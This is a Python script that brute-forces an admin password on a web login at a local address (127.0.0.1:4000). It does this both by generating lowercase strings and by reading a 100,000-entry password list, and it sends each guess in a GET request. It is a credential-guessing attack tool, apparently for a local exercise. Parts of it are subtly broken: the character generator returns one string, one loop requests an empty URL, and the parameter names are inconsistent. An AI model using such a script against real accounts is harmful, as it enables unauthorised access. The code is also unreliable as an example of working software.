import requests

url = 'http://127.0.0.1:4000/users?login=admin&password={password}'


alphabet = 'abcdefghijklmnopqrstuvwxyz'

def generate_passwords(length):
    if length == 1:
        return alphabet.split()
    else:
        return [char + password for char in alphabet for password in generate_passwords(length - 1)]


def brute_force_password_with_len():
    for length in range(1, 10):
        for password in generate_passwords(length):
            response = requests.get(f"")
            if response.status_code == 200:
                print(f'Password is {password.strip()}')
                return
            print(f'Failed password: {password.strip()}')
            
def brute_force_from_file():
    with open('passwords-100000.txt') as f:
        for password in f:
            response = requests.get(f"http://127.0.0.1:4000/users?login=admin&pass={password.strip()}")
            if response.status_code == 200:
                print(f'Password is {password.strip()}')
                return


# print(generate_passwords(3))

# brute_force_password_with_len()
brute_force_from_file()